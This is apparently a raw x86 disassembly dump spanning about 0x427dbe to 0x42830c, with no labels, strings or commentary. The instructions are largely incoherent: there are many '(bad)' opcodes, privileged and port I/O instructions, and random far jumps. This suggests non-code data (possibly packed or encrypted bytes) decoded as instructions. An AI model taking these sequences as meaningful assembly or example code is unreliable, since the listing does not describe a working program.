  427dbe:	fs aad 0x9b
  427dc1:	jmp    0xebb9d34f
  427dc6:	pop    esp
  427dc7:	push   es
  427dc8:	jbe    0x427d73
  427dca:	hlt    
  427dcb:	push   ss
  427dcc:	(bad)  
  427dcd:	pop    ds
  427dce:	push   esp
  427dcf:	in     al,0xd0
  427dd1:	push   eax
  427dd2:	lods   al,BYTE PTR ds:[esi]
  427dd3:	mov    eax,DWORD PTR [edx]
  427dd5:	(bad)  
  427dd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427dd7:	jnp    0x427e01
  427dd9:	sub    eax,DWORD PTR [ebp+0xf6e0ad0]
  427ddf:	inc    ebx
  427de0:	pop    ebp
  427de1:	xchg   esp,eax
  427de2:	mov    ecx,0xa0033627
  427de7:	add    DWORD PTR [ecx-0x23b1cc2],ebx
  427ded:	int    0xec
  427def:	retf   
  427df0:	frstor [edx-0x7b]
  427df3:	arpl   cx,sp
  427df5:	mov    edi,0x19dcc31b
  427dfa:	test   al,0xcd
  427dfc:	push   ds
  427dfd:	int    0x68
  427dff:	call   0xd5c42f97
  427e04:	sub    al,0x9a
  427e06:	ret    
  427e07:	dec    ebp
  427e08:	into   
  427e09:	mov    ch,0x95
  427e0b:	rdpmc  
  427e0d:	sub    eax,0xd5f65878
  427e12:	jl     0x427def
  427e14:	stos   DWORD PTR es:[edi],eax
  427e15:	dec    ebp
  427e16:	call   0x5ced:0x1b251a0a
  427e1d:	fisub  DWORD PTR [ebx-0x42]
  427e20:	pop    ss
  427e21:	and    eax,0x7f993c65
  427e26:	adc    eax,0x67e81a4d
  427e2b:	mov    ebx,0x415ae0fc
  427e30:	cld    
  427e31:	mov    ah,0x55
  427e33:	cmp    bh,BYTE PTR [ebp-0x40f482e2]
  427e39:	sahf   
  427e3a:	sbb    al,0x14
  427e3c:	dec    ebx
  427e3d:	sbb    BYTE PTR [ecx-0x3bfbc3b9],ch
  427e43:	and    al,0x46
  427e45:	xchg   ecx,eax
  427e46:	add    dl,bh
  427e48:	add    DWORD PTR [ecx],eax
  427e4a:	iret   
  427e4b:	mov    eax,0x1b7b9afe
  427e50:	push   esi
  427e51:	js     0x427e36
  427e53:	shl    DWORD PTR [edx+0x54cd41f1],cl
  427e59:	mov    al,0xe0
  427e5b:	fild   WORD PTR ds:[ecx]
  427e5e:	jmp    0x427e4f
  427e60:	das    
  427e61:	ficom  DWORD PTR [esi-0x30d6827b]
  427e67:	iret   
  427e68:	dec    ebp
  427e69:	xchg   ecx,eax
  427e6a:	std    
  427e6b:	mov    WORD PTR [ebp-0x33],es
  427e6e:	cmp    edx,ebx
  427e70:	lock pop ss
  427e72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e73:	mov    ah,0xc6
  427e75:	xchg   esp,eax
  427e76:	adc    ebp,DWORD PTR [ebx+0x2065406]
  427e7c:	mov    bl,0x45
  427e7e:	ins    DWORD PTR es:[edi],dx
  427e7f:	out    0xf,eax
  427e81:	xchg   BYTE PTR [eax+0x4f],dl
  427e84:	mov    ebx,0x4cef68ad
  427e89:	xlat   BYTE PTR ds:[ebx]
  427e8a:	scas   eax,DWORD PTR es:[edi]
  427e8b:	jmp    0xa565:0x24d199bd
  427e92:	sbb    BYTE PTR [ebx+ebx*8],ch
  427e95:	or     al,0x3b
  427e97:	pop    ss
  427e98:	leave  
  427e99:	ret    
  427e9a:	xchg   DWORD PTR [ecx+0x41],ebp
  427e9d:	xchg   ebp,eax
  427e9e:	ins    DWORD PTR es:[edi],dx
  427e9f:	xor    esp,DWORD PTR [edi+0x5d9f8df1]
  427ea5:	inc    edx
  427ea6:	dec    edx
  427ea7:	and    DWORD PTR [eax+0x16],esp
  427eaa:	and    cl,ah
  427eac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427ead:	clc    
  427eae:	sti    
  427eaf:	(bad)  
  427eb0:	jp     0x34bff165
  427eb6:	mov    bl,0x70
  427eb8:	mov    ecx,0x6d4d8dd7
  427ebd:	paddsb mm1,QWORD PTR [edi+ecx*8-0x61]
  427ec2:	sbb    BYTE PTR [edx-0x42],cl
  427ec5:	pop    ecx
  427ec6:	cli    
  427ec7:	inc    esp
  427ec8:	test   DWORD PTR [ecx+0x7],edi
  427ecb:	sti    
  427ecc:	cwde   
  427ecd:	ins    DWORD PTR es:[edi],dx
  427ece:	xlat   BYTE PTR ds:[ebx]
  427ecf:	div    BYTE PTR [eax]
  427ed1:	push   0xffffffc4
  427ed3:	ins    DWORD PTR es:[edi],dx
  427ed4:	sbb    dh,BYTE PTR [esi+eax*4]
  427ed7:	lahf   
  427ed8:	sub    eax,0xc66db38b
  427edd:	fucom  st(2)
  427edf:	xor    bl,BYTE PTR [ecx]
  427ee1:	jb     0x427eac
  427ee3:	dec    edx
  427ee4:	dec    esp
  427ee5:	pop    esi
  427ee6:	out    dx,al
  427ee7:	daa    
  427ee8:	adc    dh,dh
  427eea:	ss cmp esp,edi
  427eed:	mov    al,ds:0x2a635096
  427ef2:	sub    al,0x95
  427ef4:	rcl    DWORD PTR [edx+0x17],1
  427ef7:	xor    bh,cl
  427ef9:	scas   al,BYTE PTR es:[edi]
  427efa:	fcmovbe st,st(2)
  427efc:	adc    al,bh
  427efe:	repnz int3 
  427f00:	xchg   edx,eax
  427f01:	rol    edx,1
  427f03:	cdq    
  427f04:	jl     0x427f40
  427f06:	(bad)  
  427f07:	pop    esi
  427f08:	aaa    
  427f09:	sub    eax,0x6f53a3ff
  427f0e:	jmp    0xfba2:0xc4d01748
  427f15:	jmp    0xbb7c:0xc7728af3
  427f1c:	or     cl,BYTE PTR [eax+0x2b]
  427f1f:	(bad)  
  427f20:	fs leave 
  427f22:	and    BYTE PTR [ecx],dh
  427f24:	push   0x1d9c697f
  427f29:	fimul  DWORD PTR [edx+0x5372d2c]
  427f2f:	xchg   edx,eax
  427f30:	pop    edi
  427f31:	repz repz xchg ebp,eax
  427f34:	sbb    BYTE PTR [edx],bh
  427f36:	rcl    DWORD PTR [esi+0x3465fd1a],1
  427f3c:	fdiv   DWORD PTR [ecx-0x6a9b66b0]
  427f42:	lock gs xor eax,0x153e5f31
  427f49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427f4a:	xor    eax,0x536655a6
  427f4f:	or     DWORD PTR [eax],edi
  427f51:	or     al,0xc6
  427f53:	mov    cl,0xb5
  427f55:	jmp    0x0:0xc9ba
  427f5c:	add    BYTE PTR [eax],al
  427f5e:	add    BYTE PTR [eax],al
  427f60:	add    BYTE PTR [ebx+ecx*4-0x2000283b],dh
  427f67:	mov    dh,0xeb
  427f69:	xor    BYTE PTR [eax+0x2075bbe1],ch
  427f6f:	cs cdq 
  427f71:	mov    edx,0x940001f5
  427f76:	add    eax,DWORD PTR [eax]
  427f78:	add    BYTE PTR [edi+0x3a],cl
  427f7b:	pop    ds
  427f7c:	or     al,0xc8
  427f7e:	shl    ebp,0xb3
  427f81:	loopne 0x427f46
  427f83:	mov    ebp,0xc4664b7f
  427f88:	sbb    ah,ah
  427f8a:	ss pushf 
  427f8c:	scas   eax,DWORD PTR es:[edi]
  427f8d:	ja     0x427ff6
  427f8f:	sbb    ch,BYTE PTR [esi-0x12]
  427f92:	lds    edx,FWORD PTR [edi-0x7b]
  427f95:	mov    bh,0x10
  427f97:	jnp    0x427f3d
  427f99:	mov    ds:0x6a8fb423,eax
  427f9e:	stos   BYTE PTR es:[edi],al
  427f9f:	stos   BYTE PTR es:[edi],al
  427fa0:	or     DWORD PTR [esi+0x4a83928a],ebp
  427fa6:	(bad)  [ebx-0x4]
  427fa9:	jmp    0x427ffc
  427fab:	ins    BYTE PTR es:[edi],dx
  427fac:	adc    eax,0x1c758e70
  427fb1:	pop    esp
  427fb2:	xlat   BYTE PTR ds:[ebx]
  427fb3:	jecxz  0x427f7e
  427fb5:	and    al,BYTE PTR [ecx+0x3d]
  427fb8:	sub    dl,BYTE PTR [edi-0x3c]
  427fbb:	les    ecx,FWORD PTR [ecx-0x6655040b]
  427fc1:	dec    ecx
  427fc2:	jge    0x42802b
  427fc4:	push   esp
  427fc5:	ret    
  427fc6:	and    al,0xac
  427fc8:	add    DWORD PTR [edx-0x79abe2bb],eax
  427fce:	imul   edi,ebp,0x6479d3d4
  427fd4:	sub    ah,bh
  427fd6:	xchg   ebp,eax
  427fd7:	xchg   ebp,eax
  427fd8:	fs lock inc edi
  427fdb:	mov    eax,ds:0xa571193a
  427fe0:	popf   
  427fe1:	push   ecx
  427fe2:	and    ch,cl
  427fe4:	pop    ss
  427fe5:	and    eax,0x69bdb155
  427fea:	out    0x81,al
  427fec:	bound  eax,QWORD PTR [edi+0x0]
  427fef:	inc    ebx
  427ff0:	mov    ds:0x36fc7b7c,al
  427ff5:	add    ah,BYTE PTR [edi+eax*4-0x3327a4f1]
  427ffc:	sub    eax,0x3828d121
  428001:	inc    esp
  428002:	mov    dh,0x79
  428004:	and    esi,DWORD PTR [edi+0x427641b3]
  42800a:	mov    eax,ds:0xe7effa1e
  42800f:	jbe    0x42806f
  428011:	add    al,0xea
  428013:	out    dx,al
  428014:	test   esp,esi
  428016:	cmp    eax,0xa9ea328e
  42801b:	dec    DWORD PTR [edi-0x7d5c69b7]
  428021:	mov    bl,0x1
  428023:	data16 hlt 
  428025:	jae    0x427fdd
  428027:	cdq    
  428028:	adc    esi,ebx
  42802a:	cld    
  42802b:	leave  
  42802c:	in     eax,0x80
  42802e:	push   esp
  42802f:	fidiv  DWORD PTR [esp+edi*2-0x4e]
  428033:	test   BYTE PTR [edi+edx*2+0x27],ch
  428037:	push   0xc3a5e853
  42803c:	pop    es
  42803d:	dec    esi
  42803e:	add    al,bh
  428040:	inc    ebp
  428041:	inc    eax
  428042:	fidivr WORD PTR [esi+0x1252624f]
  428048:	jmp    0x427ff9
  42804a:	pop    edx
  42804b:	jle    0x427fdf
  42804d:	jp     0x42806c
  42804f:	xchg   ecx,eax
  428050:	dec    ebp
  428051:	sbb    al,0x65
  428053:	stos   BYTE PTR es:[edi],al
  428054:	mov    al,0x99
  428056:	iret   
  428057:	xchg   edi,eax
  428058:	or     eax,0xf15f3cb5
  42805d:	mov    bl,0x54
  42805f:	pop    ss
  428060:	in     eax,0x67
  428062:	in     eax,0xaf
  428064:	repnz sbb eax,DWORD PTR [ecx-0x65]
  428068:	push   edi
  428069:	call   0xaae6eb39
  42806e:	test   DWORD PTR [edx],edi
  428070:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428072:	(bad)  
  428073:	and    al,0x79
  428075:	sbb    eax,0x272734f8
  42807a:	xchg   ebp,eax
  42807b:	xchg   esi,eax
  42807c:	call   0x9e2b0ff7
  428081:	adc    DWORD PTR [esi+edx*8],edi
  428084:	pop    ebp
  428085:	aad    0x25
  428087:	rcl    DWORD PTR [eax],cl
  428089:	sub    cl,bl
  42808b:	dec    edi
  42808c:	ficom  WORD PTR [esi-0x4fce60d6]
  428092:	or     BYTE PTR [eax-0x69c97025],ch
  428098:	mov    DWORD PTR [eax],0x2fe385a9
  42809e:	sbb    ebp,eax
  4280a0:	mov    al,ds:0x92c5ac36
  4280a5:	(bad)  
  4280a6:	fisubr DWORD PTR [ebp-0x67]
  4280a9:	sti    
  4280aa:	iret   
  4280ab:	jns    0x42806e
  4280ad:	sbb    DWORD PTR [eax+ebp*2+0x7d],edx
  4280b1:	sub    BYTE PTR [ecx-0x76],dl
  4280b4:	aas    
  4280b5:	sbb    eax,ecx
  4280b7:	mov    eax,ds:0x90da0ef7
  4280bc:	jne    0x42810e
  4280be:	ret    0xd4d5
  4280c1:	mov    ds:0x185d53cc,eax
  4280c6:	iret   
  4280c7:	test   DWORD PTR [ecx-0x27d4746c],eax
  4280cd:	sub    esi,DWORD PTR [edx-0x4a278abf]
  4280d3:	xchg   edx,eax
  4280d4:	fisub  DWORD PTR fs:[edi-0x2e]
  4280d9:	xchg   esi,eax
  4280da:	je     0x4280d9
  4280dc:	lods   eax,DWORD PTR ds:[esi]
  4280dd:	je     0x428067
  4280df:	xor    DWORD PTR [edx+0x2223d9cb],ebp
  4280e5:	cmp    DWORD PTR [eax-0xc21bf60],esp
  4280eb:	stos   BYTE PTR es:[edi],al
  4280ec:	mov    ebp,0x80aa1c87
  4280f1:	cmp    BYTE PTR [esp+esi*1],dl
  4280f4:	add    cl,BYTE PTR ds:0x9f776f1d
  4280fa:	push   es
  4280fb:	add    esi,DWORD PTR [ecx+0x3f]
  4280fe:	das    
  4280ff:	mov    cx,0x5df2
  428103:	adc    eax,0x9a336fdb
  428108:	xchg   ebx,eax
  428109:	adc    bh,BYTE PTR [eax-0x8]
  42810c:	mov    eax,ds:0x7ab23fb1
  428111:	sbb    ebp,esi
  428113:	adc    bh,BYTE PTR [eax+0x7e]
  428116:	dec    ebp
  428117:	mov    ?,WORD PTR ds:0xffacd3d5
  42811d:	jge    0x4280a8
  42811f:	sbb    eax,0xfc8083f1
  428124:	cmp    BYTE PTR [ebx-0x52],cl
  428127:	dec    esi
  428128:	mov    dh,0x66
  42812a:	icebp  
  42812b:	scas   al,BYTE PTR es:[edi]
  42812c:	dec    eax
  42812d:	pop    esp
  42812e:	(bad)  
  42812f:	in     eax,dx
  428130:	psrad  mm1,QWORD PTR [edx-0x33]
  428134:	dec    esp
  428135:	loopne 0x4280e2
  428137:	cmp    al,0x84
  42813a:	clc    
  42813b:	xchg   ecx,eax
  42813c:	int3   
  42813d:	es sbb bl,cl
  428140:	into   
  428141:	aas    
  428142:	push   ss
  428143:	sbb    al,0xb7
  428145:	cmp    eax,0x5c21de2f
  42814a:	sub    dl,BYTE PTR [ecx]
  42814c:	stos   DWORD PTR es:[edi],eax
  42814d:	sti    
  42814e:	inc    ebp
  42814f:	repnz sar DWORD PTR [eax],cl
  428152:	xchg   esi,eax
  428153:	sub    edi,0xf5fc63d6
  428159:	add    BYTE PTR [ecx+0x247049e9],cl
  42815f:	sub    eax,0x94c1e6c2
  428164:	mov    cl,0x19
  428166:	ins    DWORD PTR es:[edi],dx
  428167:	and    al,BYTE PTR [ecx-0x2]
  42816a:	jmp    DWORD PTR [edi-0x59]
  42816d:	sub    bh,dh
  42816f:	inc    ebp
  428170:	sbb    esp,DWORD PTR [ebx+0x17]
  428173:	sub    edi,DWORD PTR [ecx]
  428175:	mov    WORD PTR [edi-0x41],?
  428178:	mov    ebx,?
  42817a:	sbb    DWORD PTR [ebx+0x29c44d4a],edi
  428180:	(bad)  
  428181:	(bad)  
  428182:	retf   0xb8f6
  428185:	cmc    
  428186:	jl     0x4281e1
  428188:	pop    esi
  428189:	adc    cl,ah
  42818b:	pusha  
  42818c:	pop    ecx
  42818d:	lods   eax,DWORD PTR ds:[esi]
  42818e:	pop    ss
  42818f:	push   0xffffffee
  428191:	fwait
  428192:	std    
  428193:	mov    ah,dh
  428195:	adc    al,0xa1
  428197:	int    0xe5
  428199:	daa    
  42819a:	sbb    eax,0xda6aa605
  42819f:	dec    edx
  4281a0:	out    0xdf,eax
  4281a2:	(bad)  
  4281a3:	out    dx,al
  4281a4:	scas   al,BYTE PTR es:[edi]
  4281a5:	sbb    al,0xd5
  4281a7:	dec    ebx
  4281a8:	dec    BYTE PTR [eax]
  4281aa:	mov    esi,0x3af7016b
  4281af:	add    dh,BYTE PTR [ebp-0x6f3985b6]
  4281b5:	popa   
  4281b6:	gs ja  0x42816f
  4281b9:	cmp    bh,BYTE PTR [edx+0x86120cd]
  4281bf:	cmp    al,0x99
  4281c1:	xor    DWORD PTR [ecx],esi
  4281c3:	or     eax,0x3901181a
  4281c8:	pop    ebp
  4281c9:	jp     0x428241
  4281cb:	es repnz ffreep st(1)
  4281cf:	pop    ebx
  4281d0:	int3   
  4281d1:	push   cs
  4281d2:	cmp    al,0x6b
  4281d4:	ret    0x680c
  4281d7:	sbb    ch,BYTE PTR [ebp+0x5270ec87]
  4281dd:	mov    edx,0x2b60eb19
  4281e2:	mov    al,0xcc
  4281e4:	push   0x3266332a
  4281e9:	repz js 0x428197
  4281ec:	(bad)  
  4281ed:	out    dx,al
  4281ee:	es sbb al,0x6
  4281f1:	adc    eax,0xf210aefd
  4281f6:	jae    0x4281dc
  4281f8:	outs   dx,DWORD PTR ds:[esi]
  4281f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4281fa:	cmp    eax,0x18594204
  4281ff:	pop    edi
  428200:	mov    dh,0xa3
  428202:	fwait
  428203:	out    0xbc,al
  428205:	fwait
  428206:	ja     0x428281
  428208:	mov    ecx,0x3fc4b02e
  42820d:	mov    sp,0x2338
  428211:	int3   
  428212:	or     esi,DWORD PTR [ebx-0x55]
  428215:	leave  
  428216:	test   BYTE PTR [edx+0x61],ah
  428219:	aad    0x88
  42821b:	mov    edx,0xbaa92e33
  428220:	xchg   ebp,eax
  428221:	not    BYTE PTR [esi-0x78]
  428224:	jns    0x428239
  428226:	cmc    
  428227:	std    
  428228:	or     dh,BYTE PTR [ebx]
  42822a:	sbb    al,0x8d
  42822c:	push   cs
  42822d:	rcr    DWORD PTR [ebp-0x7b],cl
  428230:	pop    ds
  428231:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428232:	shl    esp,cl
  428234:	in     al,0x2d
  428236:	pop    edx
  428237:	adc    DWORD PTR [ebp+0x27],ecx
  42823a:	sbb    BYTE PTR [ecx],0xb1
  42823d:	addr16 jne 0x4281fe
  428240:	gs cld 
  428242:	sbb    eax,0x848e5b70
  428247:	jecxz  0x428266
  428249:	dec    ebp
  42824a:	call   0x5d9c2628
  42824f:	dec    esi
  428250:	dec    eax
  428251:	push   esi
  428252:	cmp    al,0x6d
  428254:	pop    ecx
  428255:	popf   
  428256:	in     eax,dx
  428257:	loopne 0x428237
  428259:	pop    edx
  42825a:	mov    dl,0x2a
  42825c:	cld    
  42825d:	lds    edi,FWORD PTR [edi+0x56]
  428260:	out    dx,eax
  428261:	sub    ah,BYTE PTR [edi]
  428263:	inc    ecx
  428264:	lea    ebp,[ecx+0x10]
  428267:	(bad)  
  428269:	push   0x2199c593
  42826e:	mov    DWORD PTR [edi-0x617fdad1],edx
  428274:	lock cmp cl,BYTE PTR [esi+eax*4]
  428278:	adc    al,0x85
  42827a:	jg     0x4282f1
  42827c:	mov    BYTE PTR [eax],ch
  42827e:	or     al,0xdb
  428280:	int3   
  428281:	fst    DWORD PTR [eax]
  428283:	mov    dh,0x9f
  428285:	jge    0x4282cc
  428287:	jno    0x4282a0
  428289:	cmp    esi,esp
  42828b:	add    DWORD PTR [edi-0x13851ece],edx
  428291:	jnp    0x428237
  428293:	sub    al,0xf9
  428295:	jp     0x4282b1
  428297:	cwde   
  428298:	bound  ebp,QWORD PTR [ecx+ebx*8+0x25]
  42829c:	(bad)  
  42829d:	(bad)  
  42829e:	pop    ss
  42829f:	(bad)  
  4282a0:	jnp    0x42823e
  4282a2:	xlat   BYTE PTR ds:[ebx]
  4282a3:	jne    0x42826f
  4282a5:	sub    DWORD PTR [esi+0x6ea1f053],0xe70849cb
  4282af:	jbe    0x4282a9
  4282b1:	pop    ecx
  4282b2:	adc    eax,0xa1fafab4
  4282b7:	pusha  
  4282b8:	xchg   edi,eax
  4282b9:	and    al,0x52
  4282bb:	jle    0x42827c
  4282bd:	retf   0x60e
  4282c0:	es pop ds
  4282c2:	mov    bh,0x5
  4282c4:	sub    al,bh
  4282c6:	ret    0x5745
  4282c9:	sar    BYTE PTR [eax+0xb],1
  4282cc:	(bad)  
  4282cd:	jg     0x4282da
  4282cf:	ins    DWORD PTR es:[edi],dx
  4282d0:	inc    DWORD PTR [ecx+0x51]
  4282d3:	or     bh,dl
  4282d5:	pushf  
  4282d6:	bound  ecx,QWORD PTR [edx-0x21547c9e]
  4282dc:	adc    al,BYTE PTR [ebp-0x5a]
  4282df:	repnz and eax,0x85c32c7e
  4282e5:	stos   DWORD PTR es:[edi],eax
  4282e6:	fstp   DWORD PTR [ebx]
  4282e8:	das    
  4282e9:	fisttp WORD PTR [ebp+0x32]
  4282ec:	mov    ch,0x69
  4282ee:	xchg   ebp,eax
  4282ef:	add    esi,ebx
  4282f1:	xor    BYTE PTR [ebx],bl
  4282f3:	xchg   ebx,eax
  4282f4:	fmul   QWORD PTR [ebx-0x6383ff63]
  4282fa:	fild   WORD PTR [esi]
  4282fc:	xchg   ebp,eax
  4282fd:	(bad)  
  4282fe:	imul   ebx,DWORD PTR [eax-0x5a],0x7cf6f9fe
  428305:	xchg   ebp,eax
  428306:	fwait
  428307:	aas    
  428308:	ins    DWORD PTR es:[edi],dx
  428309:	ins    DWORD PTR es:[edi],dx
  42830a:	pop    edx
  42830b:	pusha  
  42830c:	push   cs
	...
